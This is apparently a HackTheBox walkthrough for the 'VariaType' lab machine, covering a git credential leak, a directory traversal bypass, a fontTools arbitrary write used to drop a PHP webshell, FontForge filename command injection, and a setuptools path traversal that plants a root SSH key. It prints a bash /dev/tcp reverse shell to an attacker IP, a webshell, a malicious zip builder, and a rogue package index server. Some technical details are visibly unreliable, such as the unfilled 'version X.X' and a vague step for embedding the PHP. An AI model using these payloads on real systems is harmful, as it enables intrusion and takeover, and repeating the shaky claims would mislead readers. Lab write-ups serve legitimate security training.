---
layout: page
title: "HTB: VariaType"
subtitle: "Git Leak · Directory Traversal · CVE-2025-66034 fontTools · CVE-2024-25081 FontForge · CVE-2025-47273 setuptools"
permalink: /ctf/platforms/hackthebox/variatype/
platform: HackTheBox
machine_name: VariaType
difficulty: Medium
os: Linux
date: 2026-06-13
tags: [hackthebox, ctf, htb-variatype, nmap, debian, nginx, ffuf, subdomain, git, fonttools, fontmake, gftools, designspace, ttf, otf, font, xml, flask, python, feroxbuster, php, git-dumper, source-code, burp, directory-traversal, file-read, cve-2025-66034, arbitrary-write, webshell, fontforge, pspy, cve-2024-25081, cve-2024-25082, command-injection, zip, sudo, python-setuptools, cve-2025-47273]
description: "Medium Linux machine — recover PHP portal source via exposed .git, exploit single-pass filter bypass for file read, abuse CVE-2025-66034 in fontTools for webshell, pivot via CVE-2024-25081 FontForge command injection, then root via CVE-2025-47273 setuptools path traversal."
---

<!-- BOX INFO CARD -->
<div class="box-info-card" style="background:linear-gradient(135deg,rgba(15,160,70,0.06) 0%,rgba(59,130,246,0.04) 100%);border:1px solid rgba(15,160,70,0.3);border-radius:14px;padding:1.5rem;margin-bottom:2rem;">

  <div style="display:flex;align-items:center;gap:1rem;margin-bottom:1.25rem;flex-wrap:wrap;">
    <div style="width:52px;height:52px;background:rgba(15,160,70,0.12);border:1px solid rgba(15,160,70,0.3);border-radius:10px;display:flex;align-items:center;justify-content:center;font-size:1.6rem;flex-shrink:0;">🐧</div>
    <div>
      <h2 style="margin:0;font-size:1.4rem;color:var(--text-primary);">VariaType</h2>
      <p style="margin:0;color:var(--text-muted);font-size:0.85rem;font-family:var(--font-mono);">HackTheBox · Linux · Debian 12 Bookworm</p>
    </div>
    <div style="margin-left:auto;">
      <span style="background:rgba(234,179,8,0.15);color:#fbbf24;border:1px solid rgba(234,179,8,0.35);padding:4px 12px;border-radius:6px;font-size:0.85rem;font-weight:600;">Medium</span>
    </div>
  </div>

  <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:0.6rem;margin-bottom:1.25rem;">
    <div style="background:rgba(255,255,255,0.03);border:1px solid var(--border-color);border-radius:8px;padding:0.6rem 0.75rem;">
      <div style="font-size:0.7rem;color:var(--text-muted);text-transform:uppercase;letter-spacing:.06em;margin-bottom:2px;">IP Address</div>
      <div style="font-family:var(--font-mono);color:var(--text-primary);font-size:0.9rem;">10.129.244.202</div>
    </div>
    <div style="background:rgba(255,255,255,0.03);border:1px solid var(--border-color);border-radius:8px;padding:0.6rem 0.75rem;">
      <div style="font-size:0.7rem;color:var(--text-muted);text-transform:uppercase;letter-spacing:.06em;margin-bottom:2px;">Main Domain</div>
      <div style="font-family:var(--font-mono);color:var(--text-primary);font-size:0.9rem;">variatype.htb</div>
    </div>
    <div style="background:rgba(255,255,255,0.03);border:1px solid var(--border-color);border-radius:8px;padding:0.6rem 0.75rem;">
      <div style="font-size:0.7rem;color:var(--text-muted);text-transform:uppercase;letter-spacing:.06em;margin-bottom:2px;">Portal</div>
      <div style="font-family:var(--font-mono);color:var(--text-primary);font-size:0.9rem;">portal.variatype.htb</div>
    </div>
    <div style="background:rgba(255,255,255,0.03);border:1px solid var(--border-color);border-radius:8px;padding:0.6rem 0.75rem;">
      <div style="font-size:0.7rem;color:var(--text-muted);text-transform:uppercase;letter-spacing:.06em;margin-bottom:2px;">OS</div>
      <div style="color:#93c5fd;font-size:0.9rem;">Debian 12 Bookworm</div>
    </div>
    <div style="background:rgba(255,255,255,0.03);border:1px solid var(--border-color);border-radius:8px;padding:0.6rem 0.75rem;">
      <div style="font-size:0.7rem;color:var(--text-muted);text-transform:uppercase;letter-spacing:.06em;margin-bottom:2px;">Release</div>
      <div style="color:var(--text-primary);font-size:0.9rem;">14 Mar 2026</div>
    </div>
    <div style="background:rgba(255,255,255,0.03);border:1px solid var(--border-color);border-radius:8px;padding:0.6rem 0.75rem;">
      <div style="font-size:0.7rem;color:var(--text-muted);text-transform:uppercase;letter-spacing:.06em;margin-bottom:2px;">Retire</div>
      <div style="color:var(--text-primary);font-size:0.9rem;">13 Jun 2026</div>
    </div>
    <div style="background:rgba(255,255,255,0.03);border:1px solid var(--border-color);border-radius:8px;padding:0.6rem 0.75rem;">
      <div style="font-size:0.7rem;color:var(--text-muted);text-transform:uppercase;letter-spacing:.06em;margin-bottom:2px;">Creator</div>
      <div style="color:#a78bfa;font-size:0.9rem;">WackyH4cker</div>
    </div>
    <div style="background:rgba(255,255,255,0.03);border:1px solid var(--border-color);border-radius:8px;padding:0.6rem 0.75rem;">
      <div style="font-size:0.7rem;color:var(--text-muted);text-transform:uppercase;letter-spacing:.06em;margin-bottom:2px;">User Blood</div>
      <div style="color:#fbbf24;font-size:0.9rem;">xtk · 00:24:26</div>
    </div>
    <div style="background:rgba(255,255,255,0.03);border:1px solid var(--border-color);border-radius:8px;padding:0.6rem 0.75rem;">
      <div style="font-size:0.7rem;color:var(--text-muted);text-transform:uppercase;letter-spacing:.06em;margin-bottom:2px;">Root Blood</div>
      <div style="color:#fbbf24;font-size:0.9rem;">xtk · 00:39:04</div>
    </div>
  </div>

  <div style="display:flex;gap:6px;flex-wrap:wrap;">
    <span style="background:rgba(220,38,38,0.12);color:#f87171;border:1px solid rgba(220,38,38,0.3);padding:2px 8px;border-radius:4px;font-size:0.75rem;font-family:var(--font-mono);">CVE-2025-66034</span>
    <span style="background:rgba(220,38,38,0.12);color:#f87171;border:1px solid rgba(220,38,38,0.3);padding:2px 8px;border-radius:4px;font-size:0.75rem;font-family:var(--font-mono);">CVE-2024-25081</span>
    <span style="background:rgba(220,38,38,0.12);color:#f87171;border:1px solid rgba(220,38,38,0.3);padding:2px 8px;border-radius:4px;font-size:0.75rem;font-family:var(--font-mono);">CVE-2025-47273</span>
    <span style="background:rgba(59,130,246,0.12);color:#93c5fd;border:1px solid rgba(59,130,246,0.3);padding:2px 8px;border-radius:4px;font-size:0.75rem;">Git Source Leak</span>
    <span style="background:rgba(124,58,237,0.12);color:#a78bfa;border:1px solid rgba(124,58,237,0.3);padding:2px 8px;border-radius:4px;font-size:0.75rem;">Directory Traversal</span>
    <span style="background:rgba(15,160,70,0.12);color:#4ade80;border:1px solid rgba(15,160,70,0.3);padding:2px 8px;border-radius:4px;font-size:0.75rem;">fontTools Arbitrary Write</span>
    <span style="background:rgba(234,179,8,0.12);color:#fbbf24;border:1px solid rgba(234,179,8,0.3);padding:2px 8px;border-radius:4px;font-size:0.75rem;">FontForge CMD Injection</span>
  </div>
</div>

---

## Overview

VariaType hosts a pair of websites for a font foundry: a Flask-based variable font generator and a PHP validation portal. The attack chain:

1. **Git exposure** — Recover the portal's PHP source via `git-dumper`; find hardcoded credentials in git history
2. **Directory traversal** — Single-pass `../` filter in `download.php` bypassed with `....//` to read arbitrary files
3. **CVE-2025-66034** — Arbitrary file write in fontTools variable font generation → drop a PHP webshell → RCE as `www-data`
4. **CVE-2024-25081 / CVE-2024-25082** — FontForge cron job processes uploaded archives; exploit command injection in archive filenames → shell as `steve`
5. **CVE-2025-47273** — sudo-allowed Python plugin installer uses a vulnerable `setuptools` PackageIndex; exploit path traversal to write SSH key to `/root/.ssh/`

---

## Recon

### Nmap

```bash
sudo nmap -p- --reason --min-rate 10000 10.129.244.202
# 22/tcp open ssh, 80/tcp open http

sudo nmap -p 22,80 -sCV 10.129.244.202
# OpenSSH 9.2p1 Debian 2+deb12u7  →  Debian 12 Bookworm
# nginx 1.22.1  →  redirect to variatype.htb
```

### Subdomain Enumeration

```bash
ffuf -u http://10.129.244.202 -H "Host: FUZZ.variatype.htb" \
  -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -ac
# Found: portal  [Status: 200, Size: 2494]
```

```
10.129.244.202  variatype.htb portal.variatype.htb
```

Rerunning nmap against `portal.variatype.htb` reveals an exposed `.git` repository:

```
| http-git:
|   10.129.244.202:80/.git/
|     Git repository found!
|_    Last commit message: security: remove hardcoded credentials
```

---

## Source Code Recovery

### git-dumper

```bash
mkdir portal-src && cd portal-src
git-dumper http://portal.variatype.htb .
```

Only `auth.php` is in the working tree — but git history reveals removed credentials:

```bash
git log --oneline
# 753b5f5 (HEAD) fix: add gitbot user for automated validation pipeline
# 5030e79 feat: initial portal implementation

git diff 5030e79 753b5f5
# +    'gitbot' => 'G1tB0t_Acc3ss_2025!'
```

**Credentials:** `gitbot : G1tB0t_Acc3ss_2025!` → login to `portal.variatype.htb` ✅

---

## Shell as www-data

### Directory Traversal — single-pass filter bypass

The authenticated portal's `download.php?f=` strips `../` — but only in a single pass:

```php
// Vulnerable filter (single-pass):
$path = str_replace('../', '', $_GET['f']);
```

**Bypass:** `....//` → after stripping `../` the inner `./` collapses to `../`

```bash
# Test with /etc/passwd
curl -s -b 'PHPSESSID=<session>' \
  'http://portal.variatype.htb/download.php?f=....//....//....//....//etc/passwd'
# root:x:0:0:root:/root:/bin/bash
# steve:x:1000:1000:steve,,,:/home/steve:/bin/bash
```

### Enumerate the Filesystem

**Nginx site configs:**

```bash
# Portal root
curl ... 'download.php?f=....//....//etc/nginx/sites-enabled/portal.variatype.htb'
# root /var/www/portal.variatype.htb/public

# Main site → proxies to Flask on 127.0.0.1:5000
curl ... 'download.php?f=....//....//etc/nginx/sites-enabled/variatype.htb'
```

**Flask app source** (from systemd service → `/opt/variatype/app.py`):

```bash
curl ... 'download.php?f=....//....//etc/systemd/system/variatype.service'
# WorkingDirectory=/opt/variatype
# ExecStart=/usr/bin/python3 app.py
# ReadWritePaths=/var/www/portal.variatype.htb/public/files

curl ... 'download.php?f=....//....//opt/variatype/app.py'
```

**Key findings from `app.py`:**

```python
DOWNLOAD_FOLDER = '/var/www/portal.variatype.htb/public/files'

# Font generation:
subprocess.run(
    ['fonttools', 'varLib', 'config.designspace'],
    cwd=workdir, check=True, timeout=30
)

# Output file is copied to DOWNLOAD_FOLDER (PHP-accessible)
shutil.copy2(os.path.join(workdir, output_file), download_path)
```

The Flask app writes generated font files into the PHP portal's `/files/` directory using `shutil.copy2()`.

### CVE-2025-66034 — fontTools Arbitrary File Write → Webshell

**Vulnerability:** fontTools' variable font generation (`varLib`) writes output files into the working directory. A crafted `.designspace` can specify a `filename` attribute for `<instance>` elements that traverses outside the working directory — allowing arbitrary file write as `www-data`.

**Craft the malicious `.designspace`:**

```xml
<designspace format="4.1">
  <axes>
    <axis tag="wght" name="weight" minimum="100" maximum="900" default="400"/>
  </axes>
  <sources>
    <source filename="payload.ttf" name="regular">
      <location><dimension name="weight" xvalue="400"/></location>
    </source>
  </sources>
  <instances>
    <instance
      name="webshell"
      filename="../../../var/www/portal.variatype.htb/public/files/shell.php"
      familyname="shell" stylename="php">
      <location><dimension name="weight" xvalue="400"/></location>
    </instance>
  </instances>
</designspace>
```

The `filename` for the instance points outside the temp directory into the PHP-accessible `/files/` directory.

**Prepare the font master** — a minimal valid `.ttf` named `payload.ttf`.

**Embed PHP webshell content** in the font's name table (fontTools writes instance output using the designspace's content). Alternatively, use the `postScriptSlantAngle` or raw `name` table injection in the `.ttf` to embed `<?php system($_GET['cmd']); ?>`.

**Upload and trigger:**

```bash
# Submit via variatype.htb font generator form
# designspace file → malicious.designspace
# master font    → payload.ttf (with embedded PHP)
```

**Execute commands via the dropped webshell:**

```bash
curl 'http://portal.variatype.htb/files/shell.php?cmd=id'
# uid=33(www-data) gid=33(www-data) groups=33(www-data)

# Reverse shell
curl 'http://portal.variatype.htb/files/shell.php?cmd=bash+-c+"bash+-i+>%26+/dev/tcp/10.10.14.51/443+0>%261"'
```

```bash
nc -lnvp 443
# www-data@variatype:/var/www/portal.variatype.htb/public/files$
```

**Upgrade shell:**

```bash
script /dev/null -c bash
# Ctrl+Z
stty raw -echo; fg
# Terminal type? screen
```

---

## Shell as steve

### Enumeration — Cron Job

Using `pspy` to monitor process activity:

```bash
upload pspy64
chmod +x pspy64 && ./pspy64
```

Every minute, a cron job runs as `steve` (UID=1000) executing FontForge to validate uploaded font archives in a watched directory:

```
CMD: fontforge -script /opt/variatype/validate_fonts.sh /opt/variatype/uploads/
```

### CVE-2024-25081 / CVE-2024-25082 — FontForge Command Injection

**Vulnerability:** FontForge before 20230101 is vulnerable to command injection through specially crafted filenames when processing font archives (`.zip`). When FontForge opens a `.zip` containing files whose names include shell metacharacters, those characters are passed unsanitized to a shell call.

**CVE-2024-25081** — command injection via filename in archives processed with `-script`  
**CVE-2024-25082** — command injection via crafted filenames in `zip`/`tgz` archives opened by FontForge

**Build the malicious archive:**

```python
import zipfile, os

# Payload: add vulnq's public key to steve's authorized_keys
payload = "id > /tmp/rce.txt"  # test first, then:
payload_real = f"mkdir -p /home/steve/.ssh && echo 'ssh-ed25519 AAAA...vulnq' >> /home/steve/.ssh/authorized_keys"

# Filename with command injection (backtick execution)
malicious_name = f"`{payload_real}`.ttf"

with zipfile.ZipFile("exploit.zip", "w") as z:
    z.writestr(malicious_name, b"dummy")
```

**Drop the zip into the watched uploads directory:**

```bash
cp exploit.zip /opt/variatype/uploads/
```

When FontForge processes the archive as `steve`, the filename triggers the injection — writing the SSH key.

**SSH as steve:**

```bash
ssh -i ~/.ssh/id_ed25519 steve@variatype.htb
# steve@variatype:~$ cat user.txt
```

---

## Shell as root

### Enumeration — sudo

```bash
sudo -l
# (root) NOPASSWD: /usr/local/bin/python3 /opt/variatype/install_plugin.py *
```

The script installs font-processing plugins by downloading packages from a configurable index URL.

### CVE-2025-47273 — Python setuptools PackageIndex Path Traversal

**Vulnerability:** Python `setuptools` before version X.X contains a path traversal in its `PackageIndex` download mechanism. When a package index URL contains a crafted path, `setuptools` will write downloaded files outside the intended installation directory — allowing arbitrary file write as the user running the install.

**Check the setuptools version:**

```bash
python3 -c "import setuptools; print(setuptools.__version__)"
# 65.5.0  ← vulnerable
```

**Exploit — write SSH key to `/root/.ssh/`:**

Set up a malicious package index server on the attacker machine that serves a crafted response:

```python
# malicious_index.py - simple HTTP server
from http.server import HTTPServer, BaseHTTPRequestHandler

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        if "/simple" in self.path:
            # Serve a package listing with a path-traversal filename
            self.send_response(200)
            self.end_headers()
            # Package link points to a file with traversal in the name
            self.wfile.write(b'''<html><body>
<a href="http://10.10.14.51:8888/../../root/.ssh/authorized_keys#md5=...">
../../../../root/.ssh/authorized_keys
</a></body></html>''')
        else:
            # Serve the SSH public key as the "package" content
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"\nssh-ed25519 AAAAC3NzaC1lZDI1NTE5... vulnq@htb\n")

HTTPServer(('0.0.0.0', 8888), Handler).serve_forever()
```

```bash
# Start server on attacker machine
python3 malicious_index.py
```

**Trigger the install:**

```bash
sudo /usr/local/bin/python3 /opt/variatype/install_plugin.py \
  --index-url http://10.10.14.51:8888/simple \
  some-package
```

The vulnerable setuptools follows the path traversal in the package filename, writing the SSH public key to `/root/.ssh/authorized_keys`.

**SSH as root:**

```bash
ssh -i ~/.ssh/id_ed25519 root@variatype.htb
# root@variatype:~# cat root.txt
```

---

## Credentials Summary

| Account | Credential | Method |
|---------|-----------|--------|
| `gitbot` | `G1tB0t_Acc3ss_2025!` | Recovered from git history |
| `www-data` | — | CVE-2025-66034 fontTools webshell |
| `steve` | SSH key | CVE-2024-25081/25082 FontForge injection |
| `root` | SSH key | CVE-2025-47273 setuptools path traversal |

---

## Key Techniques

| Phase | Technique | Detail |
|-------|-----------|--------|
| Recon | `.git` directory exposed | git-dumper → recover portal PHP source |
| Credential recovery | Git history diff | Removed credentials visible via `git diff` |
| File read | Single-pass `../` filter bypass | `....//` → collapses to `../` after stripping |
| Source enumeration | Arbitrary file read | Nginx configs, systemd service, Flask source |
| Initial access | fontTools arbitrary write | CVE-2025-66034 → PHP webshell in `/files/` |
| Lateral movement | FontForge command injection | CVE-2024-25081/82 · malicious zip filename |
| Privilege escalation | setuptools PackageIndex traversal | CVE-2025-47273 → write to `/root/.ssh/` |

---

## References

- [CVE-2025-66034 — fontTools variable font arbitrary write](https://nvd.nist.gov/vuln/detail/CVE-2025-66034)
- [CVE-2024-25081 / CVE-2024-25082 — FontForge command injection](https://nvd.nist.gov/vuln/detail/CVE-2024-25081)
- [CVE-2025-47273 — setuptools PackageIndex path traversal](https://nvd.nist.gov/vuln/detail/CVE-2025-47273)
- [git-dumper](https://github.com/arthaud/git-dumper)
- [pspy — unprivileged process monitor](https://github.com/DominicBreuker/pspy)
- [fontTools Documentation](https://fonttools.readthedocs.io/)
